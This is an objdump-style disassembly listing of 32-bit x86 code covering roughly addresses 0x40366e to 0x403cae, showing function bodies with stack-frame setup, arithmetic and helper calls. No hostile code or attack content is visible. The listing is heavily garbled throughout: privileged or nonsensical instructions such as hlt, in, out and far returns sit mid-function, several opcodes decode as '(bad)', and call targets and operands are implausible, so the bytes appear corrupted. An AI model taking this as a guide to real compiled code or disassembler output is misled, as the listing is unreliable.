  40366e:	89 45 d0             	mov    %eax,-0x30(%ebp)
  403671:	8b 45 d8             	mov    -0x28(%ebp),%eax
  403674:	6a 00                	push   $0x0
  403676:	05 f4 01 00 00       	add    $0x1f4,%eax
  40367b:	68 e8 03 00 00       	push   $0x3e8
  403680:	83 d1 00             	adc    $0x0,%ecx
  403683:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  403686:	51                   	push   %ecx
  403687:	50                   	push   %eax
  403688:	e8 1c 7f 00 38       	call   0x3840b5a9
  40368d:	e2 c4                	loop   0x403653
  40368f:	f4                   	hlt
  403690:	89 45 d8             	mov    %eax,-0x28(%ebp)
  403693:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403696:	6a 00                	push   $0x0
  403698:	05 f4 01 00 00       	add    $0x1f4,%eax
  40369d:	68 e8 03 00 23       	push   $0x230003e8
  4036a2:	83 41 b7 89          	addl   $0xffffff89,-0x49(%ecx)
  4036a6:	55                   	push   %ebp
  4036a7:	dc 51 50             	fcoml  0x50(%ecx)
  4036aa:	e8 e1 7e 00 00       	call   0x40b590
  4036af:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4036b2:	89 45 0d             	mov    %eax,0xd(%ebp)
  4036b5:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4036b8:	e2 00                	loop   0x4036ba
  4036ba:	05 2b 01 7a f9       	add    $0xf97a012b,%eax
  4036bf:	68 e8 03 00 00       	push   $0x3e8
  4036c4:	83 d1 00             	adc    $0x0,%ecx
  4036c7:	89 55 1c             	mov    %edx,0x1c(%ebp)
  4036ca:	27                   	daa
  4036cb:	50                   	push   %eax
  4036cc:	e8 bf 7e 00 00       	call   0x40b590
  4036d1:	81 6a f4 01 00 b4 6a 	subl   $0x6ab40001,-0xc(%edx)
  4036d8:	00 83 d3 00 68 43    	add    %al,0x436800d3(%ebx)
  4036de:	03 00                	add    (%eax),%eax
  4036e0:	00 53 57             	add    %dl,0x57(%ebx)
  4036e3:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4036e6:	89 55 ec             	mov    %edx,-0x14(%ebp)
  4036e9:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4036ea:	a2 7e 00 35 6b       	mov    %al,0x6b35007e
  4036ef:	4d                   	dec    %ebp
  4036f0:	e4 8b                	in     $0x8b,%al
  4036f2:	d8 8b 45 e0 6a ea    	fmuls  -0x15951fbb(%ebx)
  4036f8:	05 f4 01 00 00       	add    $0x1f4,%eax
  4036fd:	68 e8 ad 00 00       	push   $0xade8
  403702:	83 d1 e8             	adc    $0xffffffe8,%ecx
  403705:	89 55 cc             	mov    %edx,-0x34(%ebp)
  403708:	51                   	push   %ecx
  403709:	50                   	push   %eax
  40370a:	e8 f4 7e 00 00       	call   0x40b603
  40370f:	48                   	dec    %eax
  403710:	45                   	inc    %ebp
  403711:	e0 a1                	loopne 0x4036b4
  403713:	ac                   	lods   %ds:(%esi),%al
  403714:	02 41 8e             	add    -0x72(%ecx),%al
  403717:	85 c0                	test   %eax,%eax
  403719:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  40371c:	0f 8e 2a 01 00 00    	jle    0x40384c
  403722:	8b 9f f0 17 41 00    	mov    0x4117f0(%edi),%ebx
  403728:	a1 a8 0b 41 00       	mov    0x410ba8,%eax
  40372d:	52                   	push   %edx
  40372e:	50                   	push   %eax
  40372f:	68 b2 e1 40 00       	push   $0x40e1b2
  403734:	ff 92 a1 f0 17 fd    	call   *-0x2e80f5f(%edx)
  40373a:	00 8b 62 a8 fa 41    	add    %cl,0x41faa862(%ebx)
  403740:	19 50 50             	sbb    %edx,0x50(%eax)
  403743:	50                   	push   %eax
  403744:	43                   	inc    %ebx
  403745:	51                   	push   %ecx
  403746:	68 eb a6 40 bc       	push   $0xbc40a6eb
  40374b:	ff 14 8b             	call   *(%ebx,%ecx,4)
  40374e:	55                   	push   %ebp
  40374f:	f4                   	hlt
  403750:	36 45                	ss inc %ebp
  403752:	f0 8d 9d f0 17 b7 00 	lock lea 0xb717f0(%ebp),%ebx
  403759:	83 c4 c0             	add    $0xffffffc0,%esp
  40375c:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  40375f:	52                   	push   %edx
  403760:	50                   	push   %eax
  403761:	a1 ac 02 41 00       	mov    0x4102ac,%eax
  403766:	74 99                	je     0x403701
  403768:	52                   	push   %edx
  403769:	50                   	push   %eax
  40376a:	51                   	push   %ecx
  40376b:	53                   	push   %ebx
  40376c:	e8 1f 7e 00 00       	call   0x40b590
  403771:	8b c9                	mov    %ecx,%ecx
  403773:	45                   	inc    %ebp
  403774:	f6 41 9b 9b          	testb  $0x9b,-0x65(%ecx)
  403778:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  40377b:	50                   	push   %eax
  40377c:	8b c3                	mov    %ebx,%eax
  40377e:	d0 57 43             	rclb   $1,0x43(%edi)
  403781:	22 da                	and    %dl,%bl
  403783:	57                   	push   %edi
  403784:	51                   	push   %ecx
  403785:	68 80 e0 40 dd       	push   $0xdd40e080
  40378a:	ff d6                	call   *%esi
  40378c:	a1 ac 02 8b 00       	mov    0x8b02ac,%eax
  403791:	97                   	xchg   %eax,%edi
  403792:	4d                   	dec    %ebp
  403793:	f0 99                	lock cltd
  403795:	8b f8                	mov    %eax,%edi
  403797:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40379a:	ca c4 30             	lret   $0x30c4
  40379d:	6f                   	outsl  %ds:(%esi),(%dx)
  40379e:	c1 8b 4d ec 89 03 c4 	rorl   $0xc4,0x389ec4d(%ebx)
  4037a5:	1b b6 bd 51 8b 4d    	sbb    0x4d8b51bd(%esi),%esi
  4037ab:	e4 50                	in     $0x50,%al
  4037ad:	f4                   	hlt
  4037ae:	f0 4f                	lock dec %edi
  4037b0:	41                   	inc    %ecx
  4037b1:	00 50 52             	add    %dl,0x52(%eax)
  4037b4:	8b 08                	mov    (%eax),%ecx
  4037b6:	04 57                	add    $0x57,%al
  4037b8:	51                   	push   %ecx
  4037b9:	cb                   	lret
  4037ba:	e8 d1 7d 00 00       	call   0x40b590
  4037bf:	04 ca                	add    $0xca,%al
  4037c1:	4c                   	dec    %esp
  4037c2:	55                   	push   %ebp
  4037c3:	c4 52 8b             	les    -0x75(%edx),%edx
  4037c6:	55                   	push   %ebp
  4037c7:	00 57 4a             	add    %dl,0x4a(%edi)
  4037ca:	e2 89                	loop   0x403755
  4037cc:	45                   	inc    %ebp
  4037cd:	f8                   	clc
  4037ce:	c9                   	leave
  4037cf:	bb fc e8 ba 7d       	mov    $0x7dbae8fc,%ebx
  4037d4:	00 00                	add    %al,(%eax)
  4037d6:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4037d9:	2b c8                	sub    %eax,%ecx
  4037db:	8b 5e fc             	mov    -0x4(%esi),%ebx
  4037de:	1b c2                	sbb    %edx,%eax
  4037e0:	d8 a1 f0 17 41 30    	fsubs  0x304117f0(%ecx)
  4037e6:	51                   	push   %ecx
  4037e7:	8b 5d d8             	mov    -0x28(%ebp),%ebx
  4037ea:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4037ed:	8b 7d 59             	mov    0x59(%ebp),%edi
  4037f0:	55                   	push   %ebp
  4037f1:	cb                   	lret
  4037f2:	2b ca                	sub    %edx,%ecx
  4037f4:	8b 55 2c             	mov    0x2c(%ebp),%edx
  4037f7:	2b d7                	sub    %edi,%edx
  4037f9:	50                   	push   %eax
  4037fa:	52                   	push   %edx
  4037fb:	51                   	push   %ecx
  4037fc:	50                   	push   %eax
  4037fd:	50                   	push   %eax
  4037fe:	a1 a8 0b 41 00       	mov    0x410ba8,%eax
  403803:	50                   	push   %eax
  403804:	68 20 e0 40 00       	push   $0x40e020
  403809:	ff d6                	call   *%esi
  40380b:	8b 4d 46             	mov    0x46(%ebp),%ecx
  40380e:	4f                   	dec    %edi
  40380f:	df e8                	fucomip %st(0),%st
  403811:	a1 5c 02 41 00       	mov    0x41025c,%eax
  403816:	8b 3d f0 17 41 5b    	mov    0x5b4117f0,%edi
  40381c:	83 c4 fa             	add    $0xfffffffa,%esp
  40381f:	51                   	push   %ecx
  403820:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  403823:	52                   	push   %edx
  403824:	57                   	push   %edi
  403825:	99                   	cltd
  403826:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403827:	50                   	push   %eax
  403828:	50                   	push   %eax
  403829:	45                   	inc    %ebp
  40382a:	e4 50                	in     $0x50,%al
  40382c:	51                   	push   %ecx
  40382d:	e8 5e 7d 92 00       	call   0xd2b590
  403832:	52                   	push   %edx
  403833:	8b 55 dc             	mov    -0x24(%ebp),%edx
  403836:	50                   	push   %eax
  403837:	a1 a8 0b ad 00       	mov    0xad0ba8,%eax
  40383c:	57                   	push   %edi
  40383d:	52                   	push   %edx
  40383e:	a3 57 57 50 68       	mov    %eax,0x68505757
  403843:	fe                   	(bad)
  403844:	df 40 50             	filds  0x50(%eax)
  403847:	ff 19                	lcall  *(%ecx)
  403849:	cf                   	iret
  40384a:	c4 30                	les    (%eax),%esi
  40384c:	2e b8 df 40 00 ff    	cs mov $0xff0040df,%eax
  403852:	b0 f5                	mov    $0xf5,%al
  403854:	c4 04 2c             	les    (%esp,%ebp,1),%eax
  403857:	5e                   	pop    %esi
  403858:	5b                   	pop    %ebx
  403859:	8b e5                	mov    %ebp,%esp
  40385b:	5d                   	pop    %ebp
  40385c:	c3                   	ret
  40385d:	ca 90 90             	lret   $0x9090
  403860:	55                   	push   %ebp
  403861:	8b ec                	mov    %esp,%ebp
  403863:	83 ec 14             	sub    $0x14,%esp
  403866:	43                   	inc    %ebx
  403867:	4a                   	dec    %edx
  403868:	02 41 00             	add    0x0(%ecx),%al
  40386b:	8b 5d 10             	mov    0x10(%ebp),%ebx
  40386e:	d0 40 d3             	rolb   $1,-0x2d(%eax)
  403871:	53                   	push   %ebx
  403872:	56                   	push   %esi
  403873:	73 ca                	jae    0x40383f
  403875:	57                   	push   %edi
  403876:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403877:	8d                   	lea    (bad),%edi
  403878:	fe                   	(bad)
  403879:	65 00 21             	add    %ah,%gs:(%ecx)
  40387c:	24 75                	and    $0x75,%al
  40387e:	08 33                	or     %dh,(%ebx)
  403880:	db 9c 06 89 5e 0c 28 	fistpl 0x280c5e89(%esi,%eax,1)
  403887:	c3                   	ret
  403888:	89 5e 10             	mov    %ebx,0x10(%esi)
  40388b:	89 9e 24 08 00 00    	mov    %ebx,0x824(%esi)
  403891:	89 9e 20 08 00 00    	mov    %ebx,0x820(%esi)
  403897:	89 9e 28 08 00 00    	mov    %ebx,0x828(%esi)
  40389d:	89 5e 14             	mov    %ebx,0x14(%esi)
  4038a0:	5b                   	pop    %ebx
  4038a1:	02 50 e8             	add    -0x18(%eax),%dl
  4038a4:	38 25 02 00 eb 0f    	cmp    %ah,0xfeb0002
  4038aa:	a8 0d                	test   $0xd,%al
  4038ac:	4c                   	dec    %esp
  4038ad:	40                   	inc    %eax
  4038ae:	41                   	inc    %ecx
  4038af:	00 53 6c             	add    %dl,0x6c(%ebx)
  4038b2:	51                   	push   %ecx
  4038b3:	56                   	push   %esi
  4038b4:	e8 a7 16 00 00       	call   0x404f60
  4038b9:	8b bc a1 fc 17 41 00 	mov    0x4117fc(%ecx,%eiz,4),%edi
  4038c0:	52                   	push   %edx
  4038c1:	53                   	push   %ebx
  4038c2:	cb                   	lret
  4038c3:	48                   	dec    %eax
  4038c4:	f0 8d 55 04          	lock lea 0x4(%ebp),%edx
  4038c8:	6a 01                	push   $0x1
  4038ca:	51                   	push   %ecx
  4038cb:	57                   	push   %edi
  4038cc:	e8 1f 2d 00 00       	call   0x4065f0
  4038d1:	3b c3                	cmp    %ebx,%eax
  4038d3:	74 0e                	je     0x4038e3
  4038d5:	50                   	push   %eax
  4038d6:	26 66 e8 40 00       	es callw 0x391b
  4038db:	e8 60 e5 ff ff       	call   0x401e40
  4038e0:	3f                   	aas
  4038e1:	c4 08                	les    (%eax),%ecx
  4038e3:	8b 17                	mov    (%edi),%edx
  4038e5:	6a 01                	push   $0x1
  4038e7:	6a 08                	push   $0x8
  4038e9:	dd e8                	fucomp %st(0)
  4038eb:	2d 53 00 00 3b       	sub    $0x3b000053,%eax
  4038f0:	c3                   	ret
  4038f1:	74 0e                	je     0x403901
  4038f3:	50                   	push   %eax
  4038f4:	16                   	push   %ss
  4038f5:	95                   	xchg   %eax,%ebp
  4038f6:	fd                   	std
  4038f7:	40                   	inc    %eax
  4038f8:	36 84 42 6a          	test   %al,%ss:0x6a(%edx)
  4038fc:	ff                   	(bad)
  4038fd:	ff 83 c4 08 a1 6c    	incl   0x6ca108c4(%ebx)
  403903:	ac                   	lods   %ds:(%esi),%al
  403904:	41                   	inc    %ecx
  403905:	00 3b                	add    %bh,(%ebx)
  403907:	c3                   	ret
  403908:	74 51                	je     0x40395b
  40390a:	50                   	push   %eax
  40390b:	8b 07                	mov    (%edi),%eax
  40390d:	6a 40                	push   $0x40
  40390f:	50                   	push   %eax
  403910:	44                   	inc    %esp
  403911:	9b                   	fwait
  403912:	54                   	push   %esp
  403913:	48                   	dec    %eax
  403914:	00 3b                	add    %bh,(%ebx)
  403916:	c3                   	ret
  403917:	47                   	inc    %edi
  403918:	15 3d 87 11 01       	adc    $0x111873d,%eax
  40391d:	00 74 53 50          	add    %dh,0x50(%ebx,%edx,2)
  403921:	68 07 e8 40 2c       	push   $0x2c40e807
  403926:	92                   	xchg   %eax,%edx
  403927:	15 e5 ff ff 83       	adc    $0x83ffffe5,%eax
  40392c:	c4 08                	les    (%eax),%ecx
  40392e:	8b 0d dd 02 41 00    	mov    0x4102dd,%ecx
  403934:	8b 17                	mov    (%edi),%edx
  403936:	51                   	push   %ecx
  403937:	91                   	xchg   %eax,%ecx
  403938:	0b 00                	or     (%eax),%eax
  40393a:	00 00                	add    %al,(%eax)
  40393c:	52                   	push   %edx
  40393d:	e8 6e 54 00 00       	call   0x408db0
  403942:	3b c3                	cmp    %ebx,%eax
  403944:	74 15                	je     0x40395b
  403946:	3a 87 f2 01 00 62    	cmp    0x620001f2(%edi),%al
  40394c:	db 50 68             	fistl  0x68(%eax)
  40394f:	fc                   	cld
  403950:	e7 40                	out    %eax,$0x40
  403952:	00 e8                	add    %ch,%al
  403954:	e8 e4 08 ff 83       	call   0x843f423d
  403959:	c4 08                	les    (%eax),%ecx
  40395b:	e8 a0 30 00 00       	call   0x406a00
  403960:	a3 a0 a3 41 e8       	mov    %eax,0xe841a3a0
  403965:	89 15 38 99 41 00    	mov    %edx,0x419938
  40396b:	8b 17                	mov    (%edi),%edx
  40396d:	89 86 30 3f 00 00    	mov    %eax,0x3f30(%esi)
  403973:	6c                   	insb   (%dx),%es:(%edi)
  403974:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403975:	f4                   	hlt
  403976:	f2 88 89 86 34 2b e4 	repnz mov %cl,-0x1bd4cb7a(%ecx)
  40397d:	00 8b c4 fc 37 41    	add    %cl,0x4137fcc4(%ebx)
  403983:	00 51 a9             	add    %dl,-0x57(%ecx)
  403986:	e8 b5 3f 00 00       	call   0x407940
  40398b:	8b d8                	mov    %eax,%ebx
  40398d:	85 03                	test   %eax,(%ebx)
  40398f:	0f 84 c8 00 3d 00    	je     0x7d3a5d
  403995:	81 fb 89 75 09 00    	cmp    $0x97589,%ebx
  40399b:	f7 84 85 00 00 00 81 	testl  $0xfe23724c,-0x7f000000(%ebp,%eax,4)
  4039a2:	4c 72 23 fe 
  4039a6:	00 74 d0 8b          	add    %dh,-0x75(%eax,%edx,8)
  4039aa:	15 f8 17 41 5d       	adc    $0x5d4117f8,%eax
  4039af:	40                   	inc    %eax
  4039b0:	fc                   	cld
  4039b1:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4039b4:	c7 45 f0 19 a7 00 00 	movl   $0xa719,-0x10(%ebp)
  4039bb:	51                   	push   %ecx
  4039bc:	52                   	push   %edx
  4039bd:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4039c0:	a0 ee 28 00 00       	mov    0x28ee,%al
  4039c5:	8b 07                	mov    (%edi),%eax
  4039c7:	f4                   	hlt
  4039c8:	e8 43 2e 00 65       	call   0x65406810
  4039cd:	1f                   	pop    %ds
  4039ce:	3d 62 02 41 00       	cmp    $0x410262,%eax
  4039d3:	a1 b8 02 97 1f       	mov    0x1f9702b8,%eax
  4039d8:	47                   	inc    %edi
  4039d9:	8b 25 40 83 fd 0a    	mov    0xafd8340,%esp
  4039df:	89 3d c4 02 41 00    	mov    %edi,0x4102c4
  4039e5:	a3 b8 02 6e 00       	mov    %eax,0x6e02b8
  4039ea:	75 23                	jne    0x403a0f
  4039ec:	8b 15 d6 c0 40 d3    	mov    0xd340c0d6,%edx
  4039f2:	2e b0 d2             	cs mov $0xd2,%al
  4039f5:	40                   	inc    %eax
  4039f6:	00 83 c2 a3 52 ff    	add    %al,-0xad5c3e(%ebx)
  4039fc:	15 80 c1 40 00       	adc    $0x40c180,%eax
  403a01:	dc 5b 98             	fcompl -0x68(%ebx)
  403a04:	d2 40 00             	rolb   %cl,0x0(%eax)
  403a07:	e8 34 e4 ff b0       	call   0xb1401e40
  403a0c:	83 c4 10             	add    $0x10,%esp
  403a0f:	56                   	push   %esi
  403a10:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  403a17:	e8 44 fe ff f4       	call   0xf5403860
  403a1c:	83 c4 04             	add    $0x4,%esp
  403a1f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403a20:	5e                   	pop    %esi
  403a21:	5b                   	pop    %ebx
  403a22:	8b e5                	mov    %ebp,%esp
  403a24:	5d                   	pop    %ebp
  403a25:	d3 b8 01 00 00 00    	sarl   %cl,0x1(%eax)
  403a2b:	c7 46 14 00 00 00 00 	movl   $0x0,0x14(%esi)
  403a32:	15 88 08 8b 15       	adc    $0x158b0888,%eax
  403a37:	f8                   	clc
  403a38:	17                   	pop    %ss
  403a39:	f7 00 8d 4d 3e 89    	testl  $0x893e4d8d,(%eax)
  403a3f:	45                   	inc    %ebp
  403a40:	de 14 63             	ficoms (%ebx,%eiz,2)
  403a43:	51                   	push   %ecx
  403a44:	9b                   	fwait
  403a45:	66 c7 45 f4 04 00    	movw   $0x4,-0xc(%ebp)
  403a4b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403a4e:	89 2e                	mov    %ebp,(%esi)
  403a50:	fc                   	cld
  403a51:	e8 d9 26 00 37       	call   0x3740612f
  403a56:	5f                   	pop    %edi
  403a57:	5e                   	pop    %esi
  403a58:	5b                   	pop    %ebx
  403a59:	8b e5                	mov    %ebp,%esp
  403a5b:	5d                   	pop    %ebp
  403a5c:	c3                   	ret
  403a5d:	c7                   	(bad)
  403a5e:	7e 08                	jle    0x403a68
  403a60:	02 00                	add    (%eax),%al
  403a62:	00 00                	add    %al,(%eax)
  403a64:	8b 15 a8 02 41 8d    	mov    0x8d4102a8,%edx
  403a6a:	42                   	inc    %edx
  403a6b:	56                   	push   %esi
  403a6c:	89 dc                	mov    %ebx,%esp
  403a6e:	a8 6e                	test   $0x6e,%al
  403a70:	a2 00 e8 29 e4       	mov    %al,0xe429e800
  403a75:	ff                   	(bad)
  403a76:	ff 83 c4 04 5f 5e    	incl   0x5e5f04c4(%ebx)
  403a7c:	5b                   	pop    %ebx
  403a7d:	8b e5                	mov    %ebp,%esp
  403a7f:	5d                   	pop    %ebp
  403a80:	c3                   	ret
  403a81:	90                   	nop
  403a82:	90                   	nop
  403a83:	90                   	nop
  403a84:	90                   	nop
  403a85:	90                   	nop
  403a86:	90                   	nop
  403a87:	90                   	nop
  403a88:	90                   	nop
  403a89:	90                   	nop
  403a8a:	90                   	nop
  403a8b:	90                   	nop
  403a8c:	90                   	nop
  403a8d:	90                   	nop
  403a8e:	e4 90                	in     $0x90,%al
  403a90:	55                   	push   %ebp
  403a91:	8b ec                	mov    %esp,%ebp
  403a93:	83 46 14 56          	addl   $0x56,0x14(%esi)
  403a97:	8b b4 08 57 af 42 b6 	mov    -0x49bd50a9(%eax,%ecx,1),%esi
  403a9e:	87 c0                	xchg   %eax,%eax
  403aa0:	75 30                	jne    0x403ad2
  403aa2:	8b 86 24 2d 00 00    	mov    0x2d24(%esi),%eax
  403aa8:	85 c0                	test   %eax,%eax
  403aaa:	74 18                	je     0x403ac4
  403aac:	a1 b4 02 41 00       	mov    0x4102b4,%eax
  403ab1:	85 c0                	test   %eax,%eax
  403ab3:	0f 84 6c 85 b3 18    	je     0x18f3c025
  403ab9:	48                   	dec    %eax
  403aba:	80 b4 27 41 00 e9 61 	xorb   $0x60,0x61e90041(%edi,%eiz,1)
  403ac1:	60 
  403ac2:	c1 00 83             	roll   $0x83,(%eax)
  403ac5:	ec                   	in     (%dx),%al
  403ac6:	93                   	xchg   %eax,%ebx
  403ac7:	d5 41                	aad    $0x41
  403ac9:	00 01                	add    %al,(%ecx)
  403acb:	84 0a                	test   %cl,(%edx)
  403acd:	91                   	xchg   %eax,%ecx
  403ace:	46                   	inc    %esi
  403acf:	10 a3 8c 02 41 00    	adc    %ah,0x41028c(%ebx)
  403ad5:	e4 4f                	in     $0x4f,%al
  403ad7:	8b 4e 42             	mov    0x42(%esi),%ecx
  403ada:	a1 be 02 41 00       	mov    0x4102be,%eax
  403adf:	d4 c8                	aam    $0xc8
  403ae1:	74 18                	je     0x403afb
  403ae3:	49                   	dec    %ecx
  403ae4:	18 b8 2c 41 80 a1    	sbb    %bh,-0x5e7fbed4(%eax)
  403aea:	c0 02 66             	rolb   $0x66,(%edx)
  403aed:	00 d4                	add    %dl,%ah
  403aef:	5f                   	pop    %edi
  403af0:	89 0d b8 02 41 00    	mov    %ecx,0x4102b8
  403af6:	a3 c0 02 41 00       	mov    %eax,0x4102c0
  403afb:	a1 ac 02 41 00       	mov    0x4102ac,%eax
  403b00:	8b 0d 10 d0 40 00    	mov    0x40d010,%ecx
  403b06:	3b c1                	cmp    %ecx,%eax
  403b08:	0f 8d 17 01 00 00    	jge    0x403c25
  403b0e:	8b 15 c8 0b 41 fa    	mov    0xfa410bc8,%edx
  403b14:	8b f8                	mov    %eax,%edi
  403b16:	c1 e7 3c             	shl    $0x3c,%edi
  403b19:	03 fa                	add    %edx,%edi
  403b1b:	40                   	inc    %eax
  403b1c:	4a                   	dec    %edx
  403b1d:	ea 02 41 00 e8 da 2e 	ljmp   $0x2eda,$0xe8004102
  403b24:	bd 00 7f a0 2a       	mov    $0x2aa07f00,%ebp
  403b29:	41                   	inc    %ecx
  403b2a:	98                   	cwtl
  403b2b:	b8 d0 a4 a9 41       	mov    $0x41a9a4d0,%eax
  403b30:	00 89 86 3a 08 3c    	add    %cl,0x3c083a86(%ecx)
  403b36:	00 5a 15             	add    %bl,0x15(%edx)
  403b39:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403b3a:	0b 5d 91             	or     -0x6f(%ebp),%ebx
  403b3d:	8b 86 30 08 00 00    	mov    0x830(%esi),%eax
  403b43:	89 96 d8 08 f4 00    	mov    %edx,0xf408d8(%esi)
  403b49:	89 07                	mov    %eax,(%edi)
  403b4b:	48                   	dec    %eax
  403b4c:	8e 34 08             	mov    (%eax,%ecx,1),%?
  403b4f:	00 00                	add    %al,(%eax)
  403b51:	89 4f 04             	mov    %ecx,0x4(%edi)
  403b54:	8b 8e 38 08 00 00    	mov    0x838(%esi),%ecx
  403b5a:	8b 21                	mov    (%ecx),%esp
  403b5c:	30 08                	xor    %cl,(%eax)
  403b5e:	00 55 8b             	add    %dl,-0x75(%ebp)
  403b61:	96                   	xchg   %eax,%esi
  403b62:	b9 08 00 00 2b       	mov    $0x2b000008,%ecx
  403b67:	c8 64 86 3c          	enter  $0x8664,$0x3c
  403b6b:	2c 00                	sub    $0x0,%al
  403b6d:	00 1b                	add    %bl,(%ebx)
  403b6f:	c2 85 c0             	ret    $0xc085
  403b72:	7f 0a                	jg     0x403b7e
  403b74:	bd 9d 5a c9 73       	mov    $0x73c95a9d,%ebp
  403b79:	f5                   	cmc
  403b7a:	33 c9                	xor    %ecx,%ecx
  403b7c:	33 60 89             	xor    -0x77(%eax),%esp
  403b7f:	4f                   	dec    %edi
  403b80:	10 89 47 14 e8 8e    	adc    %cl,-0x7117ebb9(%ecx)
  403b86:	50                   	push   %eax
  403b87:	08 00                	or     %al,(%eax)
  403b89:	00 8b e0 30 08 00    	add    %cl,0x830e0(%ebx)
  403b8f:	00 8b 96 34 c9 00    	add    %cl,0xc93496(%ebx)
  403b95:	00 2b                	add    %ch,(%ebx)
  403b97:	c8 8b 86 54          	enter  $0x868b,$0x54
  403b9b:	08 d2                	or     %dl,%dl
  403b9d:	00 1b                	add    %bl,(%ebx)
  403b9f:	c2 84 c0             	ret    $0xc084
  403ba2:	7f 0a                	jg     0x403bae
  403ba4:	a3 04 85 c9 73       	mov    %eax,0x73c98504
  403ba9:	04 e4                	add    $0xe4,%al
  403bab:	07                   	pop    %es
  403bac:	33 c0                	xor    %eax,%eax
  403bae:	62 4f 18             	bound  %ecx,0x18(%edi)
  403bb1:	89 dc                	mov    %ebx,%esp
  403bb3:	1c 8b                	sbb    $0x8b,%al
  403bb5:	8e 48 08             	mov    0x8(%eax),%cs
  403bb8:	00 00                	add    %al,(%eax)
  403bba:	2e 86 40 08          	xchg   %al,%cs:0x8(%eax)
  403bbe:	00 00                	add    %al,(%eax)
  403bc0:	8b 96 44 08 00 cd    	mov    -0x32fff7bc(%esi),%edx
  403bc6:	2b c8                	sub    %eax,%ecx
  403bc8:	8b 84 4e 08 00 cd 1b 	mov    0x1bcd0008(%esi,%ecx,2),%eax
  403bcf:	c2 85 c0             	ret    $0xc085
  403bd2:	40                   	inc    %eax
  403bd3:	33 7c 97 85          	xor    -0x7b(%edi,%edx,4),%edi
  403bd7:	c9                   	leave
  403bd8:	73 04                	jae    0x403bde
  403bda:	33 e9                	xor    %ecx,%ebp
  403bdc:	6f                   	outsl  %ds:(%esi),(%dx)
  403bdd:	c0 89 4f 08 89 30 0c 	rorb   $0xc,0x3089084f(%ecx)
  403be4:	8b 0d 39 d0 40 00    	mov    0x40d039,%ecx
  403bea:	85 c9                	test   %ecx,%ecx
  403bec:	74 37                	je     0x403c25
  403bee:	8b 8f ac 02 41 c0    	mov    -0x3fbefd54(%edi),%ecx
  403bf4:	8b c7                	mov    %edi,%eax
  403bf6:	99                   	cltd
  403bf7:	f7 f9                	idiv   %ecx
  403bf9:	85 d2                	test   %edx,%edx
  403bfb:	f7 28                	imull  (%eax)
  403bfd:	44                   	inc    %esp
  403bfe:	15 19 c0 40 00       	adc    $0x40c019,%eax
  403c03:	57                   	push   %edi
  403c04:	83 c2 40             	add    $0x40,%edx
  403c07:	ba f9 e8 9a d2       	mov    $0xd29ae8f9,%edx
  403c0c:	52                   	push   %edx
  403c0d:	ff 15 80 ed 40 55    	call   *0x5540ed80
  403c13:	a1 c8 c0 40 00       	mov    0x40c0c8,%eax
  403c18:	83 96 ee 50 ff 15 54 	adcl   $0x54,0x15ff50ee(%esi)
  403c1f:	63 b1 00 83 c4 10    	arpl   %esi,0x10c48300(%ecx)
  403c25:	31 f8                	xor    %edi,%eax
  403c27:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403c28:	41                   	inc    %ecx
  403c29:	00 8b 6c 04 8d 55    	add    %cl,0x558d046c(%ebx)
  403c2f:	ec                   	in     (%dx),%al
  403c30:	c7                   	(bad)
  403c31:	33 f0                	xor    %eax,%esi
  403c33:	01 dc                	add    %ebx,%esp
  403c35:	00 0c 52             	add    %cl,(%edx,%edx,2)
  403c38:	50                   	push   %eax
  403c39:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  403c3c:	e8 bf 25 fd 7e       	call   0x7f3d6200
  403c41:	8b dd                	mov    %ebp,%ebx
  403c43:	04 51                	add    $0x51,%al
  403c45:	e8 c6 2b d6 94       	call   0x95166810
  403c4a:	56                   	push   %esi
  403c4b:	c7 46 08 5d 15 00 00 	movl   $0x155d,0x8(%esi)
  403c52:	e8 35 fc ff ff       	call   0x40388c
  403c57:	55                   	push   %ebp
  403c58:	62 93 5f 5e 8b e5    	bound  %edx,-0x1a74a1a1(%ebx)
  403c5e:	aa                   	stos   %al,%es:(%edi)
  403c5f:	c3                   	ret
  403c60:	55                   	push   %ebp
  403c61:	8b ec                	mov    %esp,%ebp
  403c63:	81 ec a0 00 3f 00    	sub    $0x3f00a0,%esp
  403c69:	53                   	push   %ebx
  403c6a:	8b 5d 26             	mov    0x26(%ebp),%ebx
  403c6d:	56                   	push   %esi
  403c6e:	3e dd fc             	ds (bad)
  403c71:	8b 4b 04             	mov    0x4(%ebx),%ecx
  403c74:	b0 50                	mov    $0x50,%al
  403c76:	0b 20                	or     (%eax),%esp
  403c78:	18 41 00             	sbb    %al,0x0(%ecx)
  403c7b:	51                   	push   %ecx
  403c7c:	c7                   	(bad)
  403c7d:	08 d7                	or     %dl,%bh
  403c7f:	00 d9                	add    %bl,%cl
  403c81:	00 00                	add    %al,(%eax)
  403c83:	ed                   	in     (%dx),%eax
  403c84:	b8 4e 00 00 8b       	mov    $0x8b00004e,%eax
  403c89:	f0 83 fe 0b          	lock cmp $0xb,%esi
  403c8d:	0f 84 07 06 00 00    	je     0x40429a
  403c93:	81 b6 68 fd 0a 00 0f 	xorl   $0x5f8840f,0xafd68(%esi)
  403c9a:	84 f8 05 
  403c9d:	00 af 81 fe d9 fc    	add    %ch,-0x326017f(%edi)
  403ca3:	0a 00                	or     (%eax),%al
  403ca5:	0f 84 ec 0e 00 56    	je     0x56404b97
  403cab:	10 3e                	adc    %bh,(%esi)
  403cad:	57                   	push   %edi
  403cae:	b0 0a                	mov    $0xa,%al
